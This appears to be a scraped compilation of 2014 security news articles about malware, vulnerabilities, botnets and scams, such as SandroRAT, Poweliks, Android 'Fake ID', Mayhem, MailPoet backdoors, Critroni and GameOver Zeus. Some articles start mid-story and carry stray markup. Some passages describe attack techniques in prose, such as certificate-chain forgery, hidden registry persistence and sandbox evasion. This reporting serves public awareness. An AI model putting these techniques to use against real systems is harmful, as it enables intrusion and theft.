This tactic to break into a computer network by gaining the confidence of an authorized user and get them to reveal information that compromises the network's security is known as Social Engineering. WHAT IS SOCIAL ENGINEERING Social engineering is nothing but a non technical kind of intrusion that relies heavily on human interaction and involves manipulating people so they give up confidential information. Social engineering was very effective those old days as well as today, as major targets are made victims using this old trick only and it is also one of the important components of many types of exploits like: Virus writers use social engineering tactics to persuade people to run malicious email attachments Phishers use social engineering tactics to convince people to disclose their sensitive information such as banking credentials and passwords Scareware vendors use social engineering to frighten people into running software that is useless at best and dangerous at worst IMPORTANCE OF SOCIAL ENGINEERING Now, the question rises, Why there is a need to understand Social engineering tactics and its importance in day-to-day life? Security experts suggest that as our culture becomes more dependent on information, social engineering will remain the greatest threat to any security system. Prevention includes educating people about the value of information, training them to protect it, and the major part is, increasing people's awareness on how social engineers operate. Christopher James Hadnagy, the President and Chief Human Hacker of Social-Engineer, Inc., wrote an absolute book on social engineering titled, Social Engineering: The Art of Human Hacking in which he detailed the entire lifecycle of social engineering and almost everything you needed to know about it. Christopher is an American security consultant, author, and professional social engineer who has spent his last 16 years in security and technology, specializing in understanding the ways in which malicious attackers are able to exploit human weaknesses to obtain access to information and resources through manipulation and deceit. In his recent released edition Unmasking the Social Engineer: The Human Element of Security (Special 50% OFF for THN Readers, Valid till August 31st, 2014), Christopher has detailed a more advanced science of understanding non-verbal communications along with the knowledge of how social engineers use these skills to build feelings of trust and relationship in their targets. The author helps his readers to understand how they can identify and detect social engineers and scammers by analyzing their non-verbal behavior, that means body language and facial expressions. It helps you understand both the aspects, to make social engineering easier, and on the other hand, also to defend against social engineering attacks easier as well. This simply means, if you can understand how a social engineer uses non-verbal behavior, then you can better defend yourself and your organization against them. THE BOOK WALKS THE READER THROUGH Clearly combines both the practical and technical aspects of social engineering security Reveals the various dirty tricks that scammers use Pinpoints what to look for on the nonverbal side to detect the social engineer Understanding Nonverbal Displays of Comfort and Discomfort Decoding the Language of the Body “The focus wasn't just to write another book about social engineering, but to present the materials in such a way that it made the information easy to grasp and use,” says Christopher Hadnagy." }

The malware, dubbed SandroRAT, is currently being used by cybercriminals to target Android users in Poland via a widely spread email spam campaign that delivers a new variant of an Android remote access tool (RAT). The emails masquerade itself as a bank alert that warns users of the malware infection in their mobile device and offers a fake mobile security solution in order to get rid of the malware infection. The mobile security solution poses as a Kaspersky Mobile Security, but in real, it is a version of SandroRAT, a remote access tool devised for Android devices, whose source code has been put on sale on underground Hack Forums since December last year. A mobile malware researcher at McAfee, Carlos Castillo, detailed the new variant of Android remote access trojan over the weekend in a blog post. According to the researcher, the package spread via phishing campaign is capable of executing several malicious commands on the infected devices. SandroRAT gives the attacker an unrestricted access to sensitive details such as SMS messages, contact lists, call logs, browser history (including banking credentials), and GPS location data stored in Android devices and store all the data in an “adaptive multi-rate file on the SD card” to later upload them to a remote command and control (C&C) server. \"Spam campaigns (via SMS or email) are becoming a very popular way to distribute Android malware, which can steal personal information or even obtain complete control of a device with a tools like SandroRat,” wrote Carlos Castillo. “This attack gains credence with the appearance of a bank offering security solutions against banking malware, a typical behavior of legitimate banks.\" This new version of SandroRAT also has a self-update feature in it and it can install additional malware through user prompts for such actions. The malware gives the attacker full control over the messages, who can intercept, block and steal incoming messages, as well as insert and delete them. It also appears that the attacker can send multimedia messages with specific parameters sent by the C&C server and can also record nearby sounds using the device’s mic. Castillo also notes that the SandroRAT variant of malware had decryption capabilities for older releases of Whatsapp messaging app. But, the users running the latest version of Whatsapp in their Android devices are not vulnerable because the developers adopted a stronger encryption scheme. “This decryption routine will not work with WhatsApp chats encrypted by the latest version of the application because the encryption scheme (crypt7) has been updated to make it stronger (using a unique server salt),” Castillo explained. “WhatsApp users should update the app to the latest version,” he advised. Users are advised to avoid application downloads from unauthorized sources, particularly when the app download link is send through an email. Good practice is to always prefer downloading apps from the Google Play Store or other trusted sources. Stay Safe! Stay Tuned!" }

But security researchers have uncovered a new and sophisticated piece of malware that infects systems and steals data without installing any file onto the targeted system. Researchers dubbed this persistent malware as Poweliks, which resides in the computer registry only and is therefore not easily detectable as other typical malware that installs files on the affected system which can be scanned by antivirus or anti-malware Software. According to Paul Rascagneres, Senior Threat Researcher, Malware analyst at GData software, due to the malware’s subsequent and step-after-step execution of code, the feature set was similar to a stacking principles of Matryoshka Doll approach. Paul has made a number of name ripping malware and bots to uncover and undermine cyber crimes. He won last years' Pwnie Award at Black Hat Las Vegas for tearing through the infrastructure of Chinese hacker group APT1. In order to infect a system, the malware spreads via emails through a malicious Microsoft Word document and after that it creates an encoded autostart registry key and to remain undetectable it keeps the registry key hidden, Rascagneres says. The malware then creates and executes shellcode, along with a payload Windows binary that tried to connect to ‘hard coded IP addresses’ in an effort to receive further commands from the attacker. \"All activities are stored in the registry. No file is ever created,\" Rascagneres said in a blog post. \"So, attackers are able to circumvent classic anti-malware file scan techniques with such an approach and are able to carry out any desired action when they reach the innermost layer of [a machine] even after a system re-boot.” \"To prevent attacks like this, antivirus solutions have to either catch the initial Word document before it is executed (if there is one), preferably before it reached the customer's email inbox.\" To create an autostart mechanism, the malware creates a registry, which is a non-ASCII character key, as Windows Regedit cannot read or open the non-ASCII key entry. CAPABILITIES OF POWELIKS MALWARE Poweliks malware is quite dangerous and can perform a number of malicious activities. The malware can: Download any payload Install spyware on the infected computer to harvest users’ personal information or business documents Install banking Trojans in order to steal money Install any other type of malicious software that can fulfil the needs of the attackers used in botnet structures generate immense revenue through ad-fraud The non-ASCII trick is a tool which the Microsoft created and uses in order to hide its source code from being copied or tampered with, but this feature was later cracked by a security researcher. The security and malware researchers on the KernelMode.info forum last month analysed a sample which is dropped by a Microsoft Word document that exploited the vulnerability described in CVE-2012-0158, which affected Microsoft products including Microsoft Office. The malware authors distributed the malware as an attachment of fake Canada Post and/or USPS email allegedly holding tracking information. \"This trick prevents a lot of tools from processing this malicious entry at all and it could generate a lot of trouble for incident response teams during the analysis. The mechanism can be used to start any program on the infected system and this makes it very powerful,\" Rascagneres said." }

Researchers at BlueBox security, who identified the vulnerability, dubbed the flaw as Fake ID, which affects all versions of Android operating system from 2.1 (released in 2010) up to Android 4.4, also known as KitKat. ALL VERSIONS ARE VULNERABLE UPTO KITKAT Researchers marked the vulnerability as critical because it could allow a fake and malicious app to masquerade as a legitimate and trusted application, enabling an attacker to perform various actions such as inserting malicious code into a legitimate app, infiltrating your personal information or even take complete control of an affected device. Specifically, devices running the 3LM administration extension are at risk for a complete compromise, which includes devices from HTC to Pantech, Sharp, Sony Ericsson, and Motorola. \"Every Android application has its own unique identity, typically inherited from the corporate developer's identity,\" Bluebox CTO Jeff Forristal wrote in a blog post published Wednesday. The bug, however, will copy the identifies and use them \"for nefarious purposes.\" WHAT IS “FAKE ID” ANDROID VULNERABILITY Researchers named the flaw \"Fake ID\" because it allows malicious applications to pass fake credentials to Android OS, which fails to properly verify the application's cryptographic signature. Instead, the operating system grants all the access permissions to the rogue application that it grants to the legitimate app. Actually, in order to establish the identity of the app developer, Android applications are signed using digital certificates. But due to the claimed Fake ID vulnerability, the Android app installer doesn’t try to authenticate the certificate chain of a given app, which means an attacker can built an app with a fake identity and impersonate it with extensive privileges such as an Adobe plug-in or Google Wallet. IMPACT AND EXAMPLES In the case of Adobe, the malware app would look like Adobe-trusted code and have the ability to escape the sandbox and run malicious code inside another app, the researchers said. “For example, an attacker can create a new digital identity certificate, forge a claim that the identity certificate was issued by Adobe Systems, and sign an application with a certificate chain that contains a malicious identity certificate and the Adobe Systems certificate,” the Bluebox researchers said in a post explaining their discovery. “Upon installation, the Android package installer will not verify the claim of the malicious identity certificate, and create a package signature that contains the both certificates. This, in turn, tricks the certificate-checking code in the webview plugin manager (who explicitly checks the chain for the Adobe certificate) and allows the application to be granted the special webview plugin privilege given to Adobe Systems – leading to a sandbox escape and insertion of malicious code, in the form of a webview plugin, into other applications.” TARGETING GOOGLE WALLET PAYMENT SYSTEM Researchers also pointed out one more target of an attacker exploiting the Fake ID vulnerability i.e. Google's own Wallet payment system. A malicious app with signature of Google Wallet would allow an attacker to access the NFC (Near Field Communications) chip in the device. The NFC chip in the device is responsible for the storage of payment information used in NFC payments via Google Wallet. This NFC is used in various electronic payment applications and a malicious code can harvest credit card numbers as well. According to Jeff Forristal, the attackers have more ways to exploit Fake ID vulnerability, a bug that he will discuss in a presentation at Black Hat in Las Vegas next week. PATCH RELEASED, BUT YOU CAN'T GET IT IMMEDIATELY Google already released a patch to its partners in April. However, it still leaves a millions of handsets out there that are still vulnerable, as it’s up to the carriers themselves to push the updates to users. The vulnerability resides in the Android operating system therefore the new update would be available for the users in the coming period, may be today, a month after or could take a year. As the researchers say, Effectively addressing a vulnerability requires a three step process: Google produces a generic code fix, which it provides to the Android phone manufacturers Then phone manufacturers must then incorporate that fix into a firmware update suitable to specific phones, which they provide to carriers The carrier then distributes the final update, which ensures your phone is safe from the vulnerability As regards Fake ID, Google has provided the generic code fix to the phone manufacturers. Bluebox Security has also built a Scanner to test for the vulnerability and has a couple of ideas for those who still haven't got the patch. Bluebox Security is the same company that uncovered the so-called Android \"Master Key\" vulnerability that allowed an attacker to modify any legitimate and digitally signed application in order to transform it into a Trojan program that could then be used to steal device’ information or take control of the device." }

Researchers dubbed the malware as Mayhem, a nasty malware modular that includes a number of payloads to cause malicious things and targets to infect only those machines which are not updated with security patches or less likely to run security software. So far, researchers have found over 1,400 Linux and FreeBSD servers around the world that have compromised by the malware, with potentially thousands more to come. Most of the compromised machines are located in the USA, Russia, Germany and Canada. Three security experts, Andrej Kovalev, Konstantin Ostrashkevich and Evgeny Sidorov, who work at Russia-based Internet portal Yandex, discovered the malware targeting *nix servers. They were able to trace transmissions from the infected computers to the two command and control (C&C) servers. \"In the *nix world, autoupdate technologies aren't widely used, especially in comparison with desktops and smartphones. The vast majority of web masters and system administrators have to update their software manually and test that their infrastructure works correctly,\" the trio wrote in a technical report for Virus Bulletin. \"For ordinary websites, serious maintenance is quite expensive and often webmasters don't have an opportunity to do it. This means it is easy for hackers to find vulnerable web servers and to use such servers in their botnets.\" Researchers say that this new type of malware can work under restricted privileges on the systems and has been created by keeping multiple functionality in mind. The malicious attack is conducted via a more sophisticated PHP script, that has a low detection rate with the antivirus engines available. Communication of the system is established with the command and control servers, which can send the malware different instructions. As we mentioned above that Mayhem is a modular, its functions can be expanded through plugins and at the moment some eight plugins have been discovered, those are listed below: rfiscan.so - Find websites that contain a remote file inclusion (RFI) vulnerability wpenum.so - Enumerate users of WordPress sites cmsurls.so - Identify user login pages in sites based on the WordPress CMS bruteforce.so - Brute force passwords for sites based on the WordPress and Joomla CMSs bruteforceng.so - Brute force passwords for almost any login page ftpbrute.so - Brute force FTP accounts crawlerng.so - Crawl web pages (by URL) and extract useful information crawlerip.so - Crawl web pages (by IP) and extract useful information In case of rfiscan.so, the malware spreads by finding servers hosting websites with a remote file inclusion (RFI) vulnerability that it checks using ‘http://www.google.com/humans.txt’ file. If the HTTP response contains the words ‘we can shake’, then the plugin decides that the website has a remote file inclusion vulnerability. Once the malware exploits an RFI, or any other weakness mentioned above, and get installed, it will run a PHP script on a victim. The PHP script kills all ‘/usr/bin/host’ processes, check for the system architecture and OS (whether Linux or FreeBSD), and then drops a malicious object identified as ‘libworker.so’. Meanwhile, the PHP script also defines a variable named ‘AU’, which includes the full URL of the script being executed. It also executes the shell script which is then being executed, then pings its Command-and-Control server. The malware then creates a hidden file system, known as sd0, and downloads all the above eight plugins, none of which were detected by the VirusTotal malware scanning tool. Mayhem was first detected in April 2014, and according to the trio, it is a continuation of the “Fort Disco” brute-force campaign that was unearthed by Arbor Networks in 2013. The Yandex researchers warned people that there may be more plugins in circulation, based on information they discovered on the two detected Command-and-Control servers, including one which specifically exploits the systems that haven’t patched the critical Heartbleed vulnerability in OpenSSL." }

A serious vulnerability in the WordPress plugin, MailPoet, could essentially allows an attacker to inject any file including malware, defacements and spam, whatever they wanted on the server and that too without any authentication. MailPoet, formerly known as Wysija Newsletter, is a WordPress plugin with more than 1.7 million downloads that allows developers running WordPress to send newsletters and manage subscribers within the content management system. In a blog post, the security researcher and CEO of the security firm Sucuri, Daniel Cid, pointed out the vulnerability to be serious and said that within three weeks since the vulnerability unveiled, over 50,000 websites have been remotely exploited by the cybercriminals to install backdoors targeting the vulnerable MailPoet plugin. Some of those compromised websites don't even run WordPress or don't have MailPoet plugin enabled in it, as the malware can infect any website that resides on the server of a hacked WordPress website, according the researcher.\"The malware code had some bugs: it was breaking many websites, overwriting good files and appending various statements in loops at the end of files,\" Cid said in a blog post. \"All the hacked sites were either using MailPoet or had it installed on another sites within the same shared account -- cross-contamination still matters.”\"To be clear, the MailPoet vulnerability is the entry point, it doesn't mean your website has to have it enabled or that you have it on the website; if it resides on the server, in a neighbouring website, it can still affect your website.\"The security firm first reported about the vulnerability on the beginning of this month. The backdoor installed is a very nasty and creates an admin account that gives attackers full administrative control. It also injects backdoor code into all themes and core files. The worst part with this infection is that the malicious code also overwrites valid files, which are very difficult to recover without a good backup in place. It causes many websites to fall over and display the message:Parse error: syntax error, unexpected ‘)’ in /home/user/public_html/site/wp-config.php on line 91.The Security firm is clarifying that every build of MailPoet is vulnerable except the only version which is the most recent released 2.6.7. So, users are recommended to update it as soon as possible. Sucuri security firm is very dedicated in finding vulnerabilities in the WordPress CMS and encouraging users to install the updates. A week ago, it urged the users to upgrade WordPress version due to a vulnerability found in the WPtouch WordPress plugin that could potentially allow any non-administrative logged-in user to upload malicious PHP files or backdoors to the target server without any admin privileges. Sucuri also found two serious vulnerabilities in the popular WordPress SEO plugin called “All in One SEO Pack” and a critical Remote Code Execution (RCE) flaw in “Disqus Comment System” Plugin of Wordpress few weeks before." }

The tragedy of the crashed Malaysia Airlines flight MH17 is no exception for the criminal minds. They are exploiting the disaster that took place last week in the disputed territory. All related to Malaysian Airline Flight MH17, a Boeing 777 aircraft carrying 283 passengers and 15 crew members, that was shot down over eastern Ukraine on July 17 by a ground-to-air missile. So far, its unclear that who is behind the tragic incident, while Ukraine and the insurgents blamed each other. Within just a week, at least six bogus Facebook pages that popped up the names of the Boeing 777 victims. According to the Australia’s Sydney Morning Herald, three of the fraudulent pages were created in the names of children who were on the plane and died. The bogus Facebook pages were came out to be click fraudsters, in which the site visitors are served a link to a phony website containing detailed information about the MH17 plane crash. Once clicked, users are then hit with a series of pop-up ads for online gambling sites and other shady services. The pages have since been shut down by Facebook , but this doesn’t stop scammers. I too caught a fake video circulating on Facebook with a fake message that promises to provide a real footage of the missile bringing down the aircraft. It baited people to click on another website with a link purporting to show footage of the MH17 disaster. 'Video Camera Caught the moment plane MH17 Crash over Ukraine.Watch here the video of Crash,' the link read. As other click fraudsters, when I clicked on the video purporting to provide access to entire footage of the tragic incident, it prompted me to share it with my other Facebook friends in order to play the video, so that the bogus video could spread to other users and so on. Obviously, I didn’t chose that, but even if you do or not , in both cases the site will redirect users to another domain that will prompt users to download a video player (windows executable file) in order to play the video successfully. People who desires to watch the MH17 Flight’s shot down video, it will lead users downloading malware into their systems or potentially unwanted applications (PUPs), similar to what we have seen in many other spam campaigns of the types. This is neither the first nor will be the last attempt of cyber criminals to leverage the tragedy of MH17 Malaysian airliner. Last week, cyber crooks used Twitter platform to widely spread short links that directed victims to the web pages known to have been linked with a variant of Zeus Trojan and the Sality malware as well, in order to steal financial information of the victims and to infect their systems with the malwares. We strictly recommend you to do not trust such videos rather follow various reputed news websites in order to get legitimate information about the incidents. Stay Safe!" }

The latest ransomware, given the name “Critroni”, includes a number of odd features that makes it out of the ordinary and according to the researchers, it’s the first ever Crypto ransomware seen that uses the Tor anonymizing network for command and control to conceal its communication. According to a detailed analysis of the ransomware threat by a French security researcher who uses the handle Kafeine, the Critroni ransomware is being sold for around $3,000 in black forums and is recently being used by a large number of attackers, including those who use the Angler exploit kit to drop a Spambot on victims’ computers. “Placing a server in onion-domain (TOR), close to domain abuse can not be practically impossible to trace the owner and shutdown the server,” reads the blog post. “Connection to the server only after encryption of all files. Early Detection is not possible on the traffic, it is impossible to block the work of the locker. Blocking TOR prevents only payment the user, not the program. Analogs are connected to the server until the crypt and can block.” The Spambot, an automated computer program designed to harvest and assist in the sending of spam emails, then downloads a number of other malicious executable, including Critroni ransomware. Once downloaded on a victim’s machine, as several other ransomware, Critroni encrypts a specific variety of files, including photos, videos and other important documents, and then displays a dialogue box that notifies the user of the malware infection and demands a payment in Bitcoins in order to decrypt the encrypted files. \"Persistent cryptography based on elliptic curves. Decrypt files without payment impossible. Equivalent resistance RSA-3072, exceeding all analogs. At the same encryption speed is much higher.\" Within 72 hours, victims have to pay the ransom amount demanded by the attacker, or otherwise the victims would lose their important files. Those who do not own Bitcoins, the ransomware provides some detailed instructions on how to acquire them, which will help users of various other countries to pay the ransom amount. Currently, the Critroni malware threat is written in English and Russian, so right now the countries that speak these languages would be at the top of the target list for attackers using the malware." }

Till now, identities of the hackers have not been identified by the agencies who are investigating the whole incident from past four years. However, it has been identified that the intruder was not a student or a teen, but the intelligence agency of another country. The Hackers successfully infiltrated the network of NASDAQ stock exchange with customized malware which had ability to extract data from the systems and carry out surveillance as well. However, a closer look at the malware indicated that it was designed to cause widespread disruption in the NASDAQ computer system. MALWARE EXPLOITS TWO 0-DAY VULNERABILITIES According to a magazine cover story, the malware that was actually used by the hackers to infect NASDAQ servers exploited two mystery zero-day vulnerabilities. The attack on the NASDAQ stock exchange was reported by Bloomberg Businessweek in its investigative cover story, \"The Nasdaq Hack\", which detailed the incidents took place at the NASDAQ leading up to the discovery of the inserted digital time bomb. According to the magazine, it all started in October 2010, when the FBI was monitoring the Internet traffic in the United States and noticed a signal coming from NASDAQ, which indicated a malware infection. The most troubling part was that the malware was actually an attack code, which was created to cause significant damage, from another country’s foreign intelligence agency. In February 2011, NASDAQ stock exchange confirmed the breach to its network and notified its customers. The feds alerted and warned NASDAQ officials, who already knew about a compromise in their systems but had neglected to bother and inform anyone about it. The U.S. National Security Agency (NSA) was called in to help investigate the hack attacks against the company that runs the NASDAQ stock market. After a five-month investigation by the FBI, NSA, CIA and US Treasury Department, it was uncovered that the malware used two unnamed Zero-day security flaws, for which there were no patches existed. Rather, it is unclear that the hackers targeted which software, and whether the hackers used these zero-day vulnerabilities to infect NASDAQ systems or to exfiltrate data. In fact, one of the forensic investigators described the NASDAQ servers as “the dirty swamp,” because very few records were available that would have revealed daily activities on the servers and helped retrace the steps of the intruders. \"The agents found little evidence of a broader attack. What they did find were systematic security failures riddling some of the most important U.S. financial institutions. It turned out that many on the list were vulnerable to the same attack that struck Nasdaq. They were spared only because the hackers hadn't bothered to try.\" Further analysis of the attacking code indicated that the malware attacked the NASDAQ systems was similar in design to the malware written by the Russian Federal Security Service for the purpose of spying and, NSA agents says, had the ability to seriously disrupt the exchange's activities. But it is also possible that the malware which had been used belongs to another country, Bloomberg notes. China was a primary suspect, for both its intrinsic features and its ability to confuse an investigation. Nasdaq spokesperson says that the malware did not reach the stock exchange, as originally stated in the cover story headline. \"The events of four years ago, while sensationalized by Businessweek, only confirmed what we have said historically: that none of Nasdaq's trading platforms or engines were ever compromised, and no evidence of exfiltration exists from directors' desks,\" said NASDAQ spokesman Ryan Wells." }

According to the U.S. intelligence officials, Malaysia Airline Flight MH17, a Boeing 777 aircraft carrying 283 passengers and 15 crew members, was struck by a ground-to-air missile. So far, it’s unclear, whether the missile was launched by the Russian military or pro-Russian separatist rebels. Ukraine and the insurgents blamed each other. Spammers and cybercriminals are quick to take advantage of the tragedy and started spreading malware through the social media websites, abusing the mystery behind the crash of Malaysia Airline Flight MH17. Researchers at the anti-virus firm Trend Micro came across some suspicious tweets written in Indonesian language. The cybercriminals are using the trending #MH17 to lure innocent users who are actually looking for news related to Malaysian Airplane Flight MH17 crash down. The suspicious tweets started spreading just after Malaysian Airline tweeted on July 17: “Malaysia Airlines has lost contact of MH17 from Amsterdam. The last known position was over Ukrainian airspace.” Hundreds of users have already retweeted those malicious tweets that indirectly encourage their individual followers to visit the malicious links. The website belongs to a shared hosting located in U.S which also host number of legitimate domains and researchers concluded that the purpose behind the spam campaign could be to gain attention of the visitors in order to make money from the advertisement. Moreover, the shared hosting also provide hostage to a number of malicious domains as well, that are connected to a ZeuS variant and SALITY malware. ZeuS are very well known to steal financial information of the users, while SALITY is a “malware family of file infectors that infect .SCR and .EXE files,” researchers said in a blog post. “Once systems are infected with this file infector, it can open their systems to other malware infections thus compromising their security.” This is not first time cyber criminals targeted Malaysian airlines. Also few months back, spammers targeted missing Malaysian plan and spread malware on the social networking sites including Facebook, abusing the mystery behind the Malaysia Airline Flight MH370, a Boeing 777-200 aircraft that had gone missing by the time it flew from Kuala Lumpur to Beijing." }

Recently, researchers at security firm FireEye have discovered a new variant of Havex remote access Trojan that has capability to actively scan OPC (Object linking and embedding for Process Control) servers, used for controlling SCADA (Supervisory Control and Data Acquisition) systems in critical infrastructure, energy, and manufacturing sectors. OPC is a communications standard that allows interaction between Windows-based SCADA or other industrial control systems (ICS) applications and process control hardware. New Havex variant gathers system information and data stored on a compromised client or server using the OPC standard. OPC is pervasive and is one of the most common ICS protocols. “Threat actors have leveraged Havex in attacks across the energy sector for over a year, but the full extent of industries and ICS systems affected by Havex is unknown,” wrote the researchers from FireEye in a blog post. “We decided to examine the OPC scanning component of Havex more closely, to better understand what happens when it’s executed and the possible implications.” Researchers set up a typical OPC server environment to conduct a real time test of the new variant's functionality. ICS or SCADA systems consist of OPC client software that interacts directly with an OPC server, which works in tandem with the PLC (Programmable Logic Controller) to control industrial hardware. Once after getting into network, the Havex downloader calls the runDll export function and then starts scanning of OPC servers in the SCADA network. To identify potential OPC server, the OPC Scanner module use the Windows networking (WNet) functions i.e. WNetOpenEnum and WNetEnumResources, that enumerates network resources or existing connections. “The scanner builds a list of all servers that are globally accessible through Windows networking,” researchers wrote. “The list of servers is then checked to determine if any of them host an interface to the Component Object Models (COM).” Using OPC scan, the new Havex variant could gather any details about connected devices and sends them back to the command-and-control server for the attackers to analyze. It appears that this new variant is used as a tool for future intelligence gathering. “This is the first “in the wild” sample using OPC scanning. It is possible that these attackers could have used this malware as a testing ground for future utilization, however,” researchers wrote. So far, researchers have not seen any attempt to control the connected hardware. The attack path, the developer and the intention behind the development of the malware is still not known, but researchers are investigating and trying to gather all the information about the new variant." }

Pushdo, a multipurpose Trojan, is primarily known for delivering financial malware such as ZeuS and SpyEye onto infected computers or to deliver spam campaigns through a commonly associated components called Cutwail that are frequently installed on compromised PCs. Pushdo was first seen over 7 years ago and was a very prolific virus in 2007. Now, a new variant of the malware is being updated to leverage a new domain-generation algorithm (DGA) as a fallback mechanism to its normal command-and-control (C&C) communication methods. DGAs are used to dynamically generating a list of domain names based on an algorithm and only making one live at a time, blocking on ‘seen’ Command & Control domain names becomes nearly impossible. With the help of a DGA, cyber criminals could have a series of advantages like overcoming domain blacklisting, resisting domain takedowns by simply registering another domain generated by the same DGA, avoiding dynamic analysis and extraction of C&C domain names. According to researchers at Bitdefender, about 6,000 compromised systems in the 1.5 million-strong botnet now host this new PushDo variant. The most affected countries so far by the new Pushdo variant are in India, Vietnam and Turkey, but systems in the United Kingdom, France and the United States have also been targeted, according to the security software firm Bitdefender. MOST AFFECTED COUNTRIES Vietnam - 1319 India - 1297 Indonesia - 610 United States - 559 Turkey - 507 Iran, Islamic Republic of - 402 Thailand - 345 Argentina - 315 Italy - 302 Mexico - 274 The Romanian firm reckons 77 systems have been compromised in the UK just in the past 24 hours, with more than 11,000 infections reported worldwide over the same period of time. “We managed to successfully intercept Pushdo traffic and gain some idea of the size of this botnet,” states Catalin Cosoi, chief security strategist at Bitdefender. “The sheer scale of this criminal operation, unsophisticated as it may be, is rather troubling and there are indications that the botnet is still in a growth phase. We shall be continuing our investigation as a key priority and further updates shall be made available in the coming days.” Despite four takedowns in past years of PushDo command-and-control (C&C) servers, the botnet endures, evolving and flourishing by continuously adding evasion techniques to mask its C&C communications. Apart from DGA, attackers have also resurfaced the public and private encryption keys used to protect the communication between the bots and the Command and Control Servers, but the protocol used for the communication remained the same. They have also added an “encrypted overlay” to the latest Pushdo binaries, which acts as a “checkup,” making sure the malware sample doesn't run properly unless certain conditions specified in the overlay are not met, said the blog post. This new approach of cyber criminals would make life harder for the FBI and law enforcement agencies who are trying every effort to take down Botnets across the world." }

Cyber criminals have brushed-up their hacking skills and are using Botnets as a cyber weapon to carry out multiple crimes like DDoS attacks (distributed denial of service), mass spamming, page rank and advertising revenue manipulation, mining bitcoins, cyber espionage and surveillance etc. 18 BOTNET INFECTIONS PER SECOND According to the director of FBI’s cyber division, Joseph Demarest, Botnet has become one of the biggest enemies of the Internet today, and therefore its impact has been significant. Yesterday during a hearing before a U.S. Senate committee, he says that every second 18 computers worldwide are part of botnet armies, which amounts to over 500 million compromised computers per year. The network of compromised systems can do a drastic cyber crime activities without the knowledge of their computer’s owner. Botnet allows its operator to steal personal and financial information, get into system owners’ bank accounts, steal millions of credit cards, shut down websites, monitor your every keystroke and can even activate systems’ cameras secretly which can take users’ at great risk. On Tuesday, a U.S. Senate committee assembled to discuss the progress of FBI agency’s current and future anti-cyber crime strategy to disrupt Botnets, with agenda: “Taking Down Botnets: Public and Private Efforts to Disrupt and dismantle Cyber Criminal Networks.” BOTNET FETCHED MILLIONS OF DOLLARS Joseph Demarest said the news is troubling as the botnets' high infection rate costs the US and global economies billions of dollars. Several successes \"But our work is never done,\" noted the FBI chief. \"The use of botnets is on the rise. Industry experts estimate that botnet attacks have resulted in the overall loss of millions of dollars from financial institutions and other major US businesses,\" Demarest said. \"As you well know, we face cyber threats from state-sponsored hackers, hackers for hire, organized cyber syndicates, and terrorists. They seek our state secrets, our trade secrets, our technology, and our ideas—things of incredible value to all of us.” TWO FACES OF THE SAME GOVERNMENT - FBI & NSA FBI trying to take down cyber criminals and putting its all effort to shut down botnet networks - which really sounds cool! But could you answer me that ‘How NSA is conducting its wider spread mass surveillance program..??’ Yes, of course, with the use of similar exploits and botnet malware. It was revealed few months ago from the Edward Snowden leaks that NSA is taking over entire networks of already-hacked machines (Botnets) and using them for their own purposes. Also at the end of last year, Dutch newspaper NRC Handelsblad reported that the document leaked by Snowden also revealed that NSA had established an army of \"sleeper cells\" – malware-infected, remote-controllable computers – on 50,000 networks by the middle of 2012, which waits for months or longer before it activates by the agency and begins harvesting data. So, when one side of U.S. government is trying every effort to shut down the widely spread botnet networks and at the same time, the other side of government is building up their weapons with the use of similar malwares and botnets, it is difficult to mitigate the problem and, this unbalanced situation of the Internet is the main cause of terror in the digital world. Well, botnets, malware, viruses, worms and other cyber threats are really a big issue for all of us, and also these attacks become more sophisticated and wider when become money motivated. We also appreciate U.S. government efforts to combat cyber crimes. A month ago, FBI and Europol also took down the GameOver Zeus botnet that have stolen more than $100 million from banks, businesses and consumers worldwide." }

GAMEOVER ZEUS TROJANThe massive botnet, essentially a collection of zombie computers, specifically was designed to steal banking passwords with the capability to perform Denial of Service (DoS) attacks on banks and other financial institutions in order to deny legitimate users access to the site, so that the thefts kept hidden from the users. As a result of it, Gameover ZeuS’ developers have stolen more than $100 million from banks, businesses and consumers worldwide. NEW GAMEOVER ZEUS TROJANOn Thursday, security researchers at the security firm Malcovery came across a series of new spam campaigns that were distributing a piece of malware based on the Gameover Zeus code which is being distributed as an attachment to spam emails, masquerading as legitimate emails from financial institutions, including M&T Bank and NatWest. \"Today Malcovery's analysts identified a new trojan based heavily on the Gameover Zeus binary, the firm's blog post read. \"It was distributed as the attachment to three spam email templates, utilizing the simplest method of infection through which this trojan is deployed.\" ATTACK VECTORMalcovery has published a full disclosure and complete rundown of the botnet, which shows that all the malicious emails it sends to lure users contain a zip file with a .scr attachment inside. Once opened, the file uses to hack into zombie computers, and the threat is danger as many anti-virus solutions were not able to detect the malicious software.“Once the attachment was opened and the malware payload executed, the malware began to make attempts to contact certain websites in accordance with a Domain Generation Algorithm (DGA). The goal of these contact attempts is to make contact with a server that can in turn provide instructions to the malware. Many sandboxes would have failed to launch the malware, as the presence of VMWare Tools will stop the malware from executing,” the analysis of the malware by Brendan Griffin and Gary Warner of Malcovery says.“Other sandboxes would not have noticed the successful connection, because the malware took between 6 and 10 minutes to randomly generate the single domain name that was used successfully to launch the new Zeus trojan and download the bank information ‘webinject’ files from the server.”This new Gameover Zeus botnet has a more robust implementation that makes it even more difficult to combat than the previous one. As Malcovery writes, “this discovery indicates that the criminals responsible for GameOver’s distribution do not intend to give up on this botnet even after suffering one of the most expansive botnet takeovers/takedowns in history.” STATEMENT BY DEPARTMENT OF JUSTICEOn Friday, the Department of Justice released a statement saying that this new Gameover Zeus botnet was not linked with the botnet that it previously targeted.“The Justice Department reported that all or nearly all of the active computers infected with Gameover Zeus have been liberated from the criminals’ control and are now communicating exclusively with the substitute server established pursuant to court order,” the agency said. “The Justice Department also reported that traffic data from the substitute server shows that remediation efforts by Internet service providers and victims have reduced the number of computers infected with Gameover Zeus by 31 percent since the disruption commenced.”" }

